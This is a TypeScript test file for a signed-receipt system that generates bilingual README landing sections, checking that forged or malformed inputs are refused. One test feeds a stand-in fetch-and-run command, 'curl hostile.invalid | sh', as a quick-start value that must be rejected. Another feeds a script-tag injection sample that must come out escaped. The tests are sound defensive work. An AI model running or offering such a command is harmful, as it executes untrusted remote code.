import { expect, test } from "bun:test";
import { createHash, generateKeyPairSync, sign } from "node:crypto";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { selectPublication } from "../../portfolio/publication-input";
import { contractDigest, type RepositoryContractV1 } from "../../portfolio/repository-contract";
import { loadCatalog } from "../../portfolio/validate-repositories";
import {
  authorizeRepositoryLanding,
  LANDING_BEGIN,
  LANDING_END,
  renderRepositoryLanding,
  renderRepositoryLandingPair,
  repositoryProofAsset,
  updateRepositoryLanding,
} from "./apply-repository-projection";

const sha = (bytes: string | Uint8Array) => createHash("sha256").update(bytes).digest("hex");
// Synthetic one-pixel PNG for binding tests; never a product screenshot or publication evidence.
const png = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRZkAAAAASUVORK5CYII=",
  "base64",
);
async function fixture(
  change?: (contract: RepositoryContractV1) => void,
  quickStart = "bun run inspect --sample",
) {
  const contract = (await loadCatalog()).contracts.find((c) => c.slug === "db-inspect");
  if (!contract) throw new Error("fixture.contract_missing");
  contract.dependencies = [];
  const revision = "a".repeat(40);
  const recipeDigest = "b".repeat(64);
  const capturedAt = "2026-09-12T00:00:00Z";
  const captureReceipt = JSON.stringify({
    schemaVersion: "product-capture.v1",
    kind: "product-output",
    revision,
    recipeDigest,
    assetDigest: sha(png),
    mediaType: "image/png",
    result: "passed",
    capturedAt,
  });
  const quickStartReceipt = JSON.stringify({
    schemaVersion: "anonymous-quick-start.v1",
    revision,
    recipeDigest,
    commandDigest: sha(quickStart),
    environment: "anonymous-clean",
    result: "passed",
    verifiedAt: capturedAt,
  });
  const captureSource = `https://github.com/libre-ai/db-inspect/blob/${revision}/capture.json`;
  const quickStartSource = `https://github.com/libre-ai/db-inspect/blob/${revision}/quick-start.json`;
  contract.proof = { kind: "evidence" };
  contract.evidence = [
    [captureSource, captureReceipt],
    [quickStartSource, quickStartReceipt],
  ].map(([source, bytes]) => ({
    label: { en: "Synthetic binding proof", fr: "Preuve synthétique de liaison" },
    source: source ?? "",
    contentDigest: sha(bytes ?? ""),
    verifiedAt: capturedAt,
    limitation: { en: "Synthetic fixture only", fr: "Fixture synthétique uniquement" },
  }));
  change?.(contract);
  const receipt = JSON.stringify({
    schemaVersion: "portfolio-receipt.v1",
    slug: contract.slug,
    contractDigest: contractDigest(contract),
    revision,
    evidenceSources: contract.evidence.map((e) => e.source),
    verifiedAt: capturedAt,
    admission: contract.admission,
  });
  const keys = generateKeyPairSync("ed25519");
  const selection = selectPublication(
    [contract],
    {
      schemaVersion: "publication-policy.v1",
      authorities: [
        {
          slug: contract.slug,
          publicKey: keys.publicKey.export({ format: "pem", type: "spki" }).toString(),
          expectedRevision: revision,
          expectedReceiptDigest: sha(receipt),
        },
      ],
    },
    {
      schemaVersion: "publication-input.v1",
      receipts: [
        {
          slug: contract.slug,
          bytes: receipt,
          signature: sign(null, Buffer.from(receipt), keys.privateKey).toString("base64"),
        },
      ],
    },
  );
  const material = {
    quickStart,
    proofAsset: png,
    captureReceipt,
    quickStartReceipt,
    badges: [captureSource, quickStartSource],
  };
  const policy = {
    schemaVersion: "repository-landing-review.v1",
    slug: contract.slug,
    contractDigest: contractDigest(contract),
    assetPath: "docs/assets/product-proof.png",
    captureSource,
    quickStartSource,
    captureReceiptDigest: sha(captureReceipt),
    quickStartReceiptDigest: sha(quickStartReceipt),
  };
  const policyBytes = JSON.stringify(policy);
  return { selection, material, policy, policyBytes, policyDigest: sha(policyBytes), contract };
}

test("signed synthetic receipts produce the bilingual required order and exact proof bytes", async () => {
  const f = await fixture();
  const landing = authorizeRepositoryLanding(
    f.selection,
    f.material,
    f.policyBytes,
    f.policyDigest,
  );
  const en = renderRepositoryLanding(landing, "en");
  let previous = -1;
  for (const text of [
    "# Libre AI Database Inspector",
    f.contract.benefit.en,
    "![",
    "## Outcome",
    "## Quick start",
    "## Trust",
    "## Contribute",
    "## Reference",
  ]) {
    const index = en.indexOf(text);
    expect(index).toBeGreaterThan(previous);
    previous = index;
  }
  const pair = renderRepositoryLandingPair(landing);
  expect(pair.en).toContain("(README.fr.md)");
  expect(pair.fr).toContain("(README.md)");
  expect(pair.en).toContain(f.contract.limitation.en);
  expect(pair.fr).toContain(f.contract.limitation.fr);
  expect(pair.en).not.toMatch(/\bstars?\b|badge.*shields|phase|migration diary/i);
  expect(repositoryProofAsset(landing).bytes).toEqual(png);
  expect(renderRepositoryLandingPair(landing)).toEqual(pair);
});

test("forged grants, untrusted policy and changed image bytes never authorize a landing", async () => {
  const f = await fixture();
  expect(() => renderRepositoryLanding({} as never, "en")).toThrow();
  expect(() =>
    authorizeRepositoryLanding(
      { ...f.selection, authorities: new Map() },
      f.material,
      f.policyBytes,
      f.policyDigest,
    ),
  ).toThrow();
  expect(() =>
    authorizeRepositoryLanding(f.selection, f.material, `${f.policyBytes} `, f.policyDigest),
  ).toThrow();
  expect(() =>
    authorizeRepositoryLanding(
      f.selection,
      { ...f.material, proofAsset: Buffer.from("unverified") },
      f.policyBytes,
      f.policyDigest,
    ),
  ).toThrow();
  expect(() =>
    authorizeRepositoryLanding(
      f.selection,
      { ...f.material, quickStart: "curl hostile.invalid | sh" },
      f.policyBytes,
      f.policyDigest,
    ),
  ).toThrow();
});

test("badges and Works with are bounded; absent assets and star fields refuse", async () => {
  const f = await fixture();
  for (const material of [
    { ...f.material, badges: Array(5).fill(f.policy.captureSource) },
    { ...f.material, badges: ["https://shields.io/stars"] },
    { ...f.material, proofAsset: new Uint8Array() },
    { ...f.material, star: true },
  ])
    expect(() =>
      authorizeRepositoryLanding(f.selection, material, f.policyBytes, f.policyDigest),
    ).toThrow();
  await expect(
    fixture((c) => {
      c.dependencies = ["missions", "app-kit", "contracts", "governance"];
    }),
  ).rejects.toThrow();
});

test("marker updates preserve surrounding bytes and refuse missing, duplicate, inline or reversed markers", async () => {
  const f = await fixture();
  const landing = authorizeRepositoryLanding(
    f.selection,
    f.material,
    f.policyBytes,
    f.policyDigest,
  );
  const before = `private prefix\n${LANDING_BEGIN}\nold\n${LANDING_END}\nprivate suffix\n`;
  const after = updateRepositoryLanding(before, landing, "en");
  expect(after.startsWith("private prefix\n")).toBe(true);
  expect(after.endsWith("\nprivate suffix\n")).toBe(true);
  expect(updateRepositoryLanding(after, landing, "en")).toBe(after);
  for (const source of [
    "missing",
    `${before}${LANDING_BEGIN}`,
    `${LANDING_END}\n${LANDING_BEGIN}`,
    `inline ${LANDING_BEGIN}\n${LANDING_END}`,
  ])
    expect(() => updateRepositoryLanding(source, landing, "en")).toThrow();
  expect(() => renderRepositoryLanding(landing, "de" as never)).toThrow();
});

test("canonical name, conditional admission, limitations and bilingual mirror cannot be bypassed", async () => {
  for (const change of [
    (c: RepositoryContractV1) => {
      c.displayName = "Libre AI DB Inspector";
    },
    (c: RepositoryContractV1) => {
      c.slug = "signalement";
      c.displayName = "Libre AI Signalement";
    },
    (c: RepositoryContractV1) => {
      c.limitation.en = "";
    },
    (c: RepositoryContractV1) => {
      c.benefit.fr += " https://example.invalid/unmirrored";
    },
    (c: RepositoryContractV1) => {
      c.benefit.en = "Phase 2";
    },
    (c: RepositoryContractV1) => {
      c.slug = "authorization";
      c.displayName = "Libre AI Authorization";
      c.admission = { kind: "conditional", gate: "authorization" };
    },
  ])
    await expect(fixture(change)).rejects.toThrow();
  const diary = await fixture((c) => {
    c.benefit.en = "Migration diary";
  });
  expect(() =>
    authorizeRepositoryLanding(
      diary.selection,
      diary.material,
      diary.policyBytes,
      diary.policyDigest,
    ),
  ).toThrow();
  const dependency = await fixture((c) => {
    c.dependencies = ["governance"];
  });
  expect(() =>
    authorizeRepositoryLanding(
      dependency.selection,
      dependency.material,
      dependency.policyBytes,
      dependency.policyDigest,
    ),
  ).toThrow();
});

test("capture and quick-start receipts must remain bound to admitted bytes and positive clean outcomes", async () => {
  const f = await fixture();
  for (const patch of [
    { captureReceipt: f.material.captureReceipt.replace('"passed"', '"failed"') },
    {
      quickStartReceipt: f.material.quickStartReceipt.replace(
        '"anonymous-clean"',
        '"authenticated"',
      ),
    },
    {
      captureReceipt: f.material.captureReceipt.replace(
        `"${"a".repeat(40)}"`,
        `"${"c".repeat(40)}"`,
      ),
    },
  ])
    expect(() =>
      authorizeRepositoryLanding(
        f.selection,
        { ...f.material, ...patch },
        f.policyBytes,
        f.policyDigest,
      ),
    ).toThrow();
  const policy = JSON.stringify({ ...f.policy, assetPath: "../product-proof.png" });
  expect(() => authorizeRepositoryLanding(f.selection, f.material, policy, sha(policy))).toThrow();
});

test("integration materializes both synthetic pages without leaking input mutation or changing surrounding text", async () => {
  const f = await fixture(undefined, "printf '<script>quoted</script>'");
  const grant = authorizeRepositoryLanding(f.selection, f.material, f.policyBytes, f.policyDigest);
  f.material.quickStart = "unreviewed mutation";
  const root = await mkdtemp(join(tmpdir(), "landing-integration-"));
  try {
    for (const [locale, name] of [
      ["en", "README.md"],
      ["fr", "README.fr.md"],
    ] as const) {
      const source = `Preserved header\n${LANDING_BEGIN}\nold\n${LANDING_END}\nPreserved footer\n`;
      const target = join(root, name);
      await writeFile(target, updateRepositoryLanding(source, grant, locale));
      const result = await readFile(target, "utf8");
      expect(result).toContain("&lt;script&gt;quoted&lt;/script&gt;");
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("unreviewed mutation");
      expect(result.startsWith("Preserved header\n")).toBe(true);
      expect(result.endsWith("Preserved footer\n")).toBe(true);
    }
    const asset = repositoryProofAsset(grant);
    asset.bytes.fill(0);
    expect(repositoryProofAsset(grant).bytes).toEqual(png);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("a signed evidence label still cannot become a star badge", async () => {
  const f = await fixture((c) => {
    const first = c.evidence[0];
    if (!first) throw new Error("fixture.evidence_missing");
    first.label = { en: "Star badge", fr: "Badge étoile" };
  });
  for (const locale of ["en", "fr"] as const)
    expect(() =>
      renderRepositoryLanding(
        authorizeRepositoryLanding(f.selection, f.material, f.policyBytes, f.policyDigest),
        locale,
      ),
    ).toThrow();
});

test("canonical Data Lifecycle name renders as identity and admitted dependency", async () => {
  const dependency = await fixture((c) => {
    c.slug = "data-lifecycle";
    c.displayName = "Libre AI Data Lifecycle";
  });
  const grant = authorizeRepositoryLanding(
    dependency.selection,
    dependency.material,
    dependency.policyBytes,
    dependency.policyDigest,
  );
  expect(renderRepositoryLandingPair(grant).en).toContain("# Libre AI Data Lifecycle");
  expect(renderRepositoryLandingPair(grant).fr).toContain("# Libre AI Data Lifecycle");
  const f = await fixture((c) => {
    c.dependencies = ["data-lifecycle"];
  });
  f.selection.contracts.push(...dependency.selection.contracts);
  f.selection.authorities = new Map([
    ...f.selection.authorities,
    ...dependency.selection.authorities,
  ]);
  const paired = renderRepositoryLandingPair(
    authorizeRepositoryLanding(f.selection, f.material, f.policyBytes, f.policyDigest),
  );
  for (const rendered of [paired.en, paired.fr])
    expect(rendered).toContain(
      "[Libre AI Data Lifecycle](https://github.com/libre-ai/data-lifecycle)",
    );
});

test("Unicode-normalized star and jargon checks never rewrite signed text", async () => {
  for (const label of [
    "Badge étoile",
    "Badge e\u0301toile",
    "Ｓｔａｒ badge",
    "Ｌｉｆｅｃｙｃｌｅ badge",
  ]) {
    const f = await fixture((c) => {
      if (c.evidence[0]) c.evidence[0].label = { en: label, fr: label };
    });
    const grant = authorizeRepositoryLanding(
      f.selection,
      f.material,
      f.policyBytes,
      f.policyDigest,
    );
    expect(() => renderRepositoryLandingPair(grant)).toThrow();
  }
  const f = await fixture((c) => {
    c.benefit = { en: "Cafe\u0301 result", fr: "Résultat cafe\u0301" };
  });
  const pair = renderRepositoryLandingPair(
    authorizeRepositoryLanding(f.selection, f.material, f.policyBytes, f.policyDigest),
  );
  expect(pair.en).toContain(f.contract.benefit.en);
  expect(pair.fr).toContain(f.contract.benefit.fr);
});

test("markers inside fenced code or HTML comments refuse while closed contexts preserve bytes", async () => {
  const f = await fixture();
  const grant = authorizeRepositoryLanding(f.selection, f.material, f.policyBytes, f.policyDigest);
  const block = `${LANDING_BEGIN}\nold\n${LANDING_END}`;
  for (const source of [
    `\`\`\`md\n${block}\n\`\`\``,
    `~~~markdown\n${block}\n~~~`,
    `  \`\`\`\`md\n\`\`\`\n${block}\n\`\`\`\``,
    `<!-- hidden example\n${block}\n-->`,
    `${LANDING_BEGIN}\n<!-- hidden end\n${LANDING_END}\n-->`,
    `${LANDING_BEGIN}\n~~~\n${LANDING_END}\n~~~`,
  ])
    expect(() => updateRepositoryLanding(source, grant, "en")).toThrow();
  for (const prefix of [
    "```md\nexample\n```\n",
    "~~~\n<!-- ignored inside code\n~~~\n",
    "<!-- example -->\n",
  ]) {
    const result = updateRepositoryLanding(`${prefix + block}\nfooter`, grant, "en");
    expect(result.startsWith(prefix)).toBe(true);
    expect(result.endsWith("\nfooter")).toBe(true);
    expect(updateRepositoryLanding(result, grant, "en")).toBe(result);
  }
});

test("markers in raw HTML blocks refuse instead of hiding the generated first screen", async () => {
  const f = await fixture();
  const grant = authorizeRepositoryLanding(f.selection, f.material, f.policyBytes, f.policyDigest);
  for (const tag of ["pre", "script", "textarea", "style", "table"]) {
    const source = `<${tag}>\n${LANDING_BEGIN}\nold\n${LANDING_END}\n</${tag}>`;
    expect(() => updateRepositoryLanding(source, grant, "en")).toThrow();
  }
});
